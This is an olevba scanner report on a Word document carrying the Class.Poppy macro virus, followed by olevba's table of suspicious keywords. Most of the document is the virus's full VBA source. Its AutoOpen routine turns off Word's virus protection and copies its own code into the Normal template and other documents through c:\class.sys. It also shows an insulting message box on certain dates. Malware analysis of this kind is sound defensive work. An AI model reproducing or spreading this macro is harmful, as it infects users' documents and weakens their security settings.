olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-f2ec3891e1364d95e8015fdb0dc369d812124c5e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-f2ec3891e1364d95e8015fdb0dc369d812124c5e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
On Error GoTo out
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
Options.VirusProtection = False
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
Options.SaveNormalPrompt = False
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
Options.ConfirmConversions = False
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
If nt > 70 And ad > 0 Then GoTo out
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
If nt < 70 Then
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
End If
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
host.codemodule.AddFromFile ("c:\class.sys")
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
With host.codemodule
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
    For x = 1 To 4
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
    .deletelines 1
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
    Next x
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
End With
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
If nt < 70 Then
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
    With host.codemodule
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
    .replaceline 1, "Sub AutoClose()"
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
    .replaceline 71, "Sub ToolsMacro()"
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
    End With
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
End If
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
With host.codemodule
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
    For x = 2 To 72 Step 2
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
    Next x
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
End With
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
out:
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
End Sub
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
Sub ViewVBCode()
'Natalia Ślizewska04-01-26 18:59:34Polski dod. hist.Punkt
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

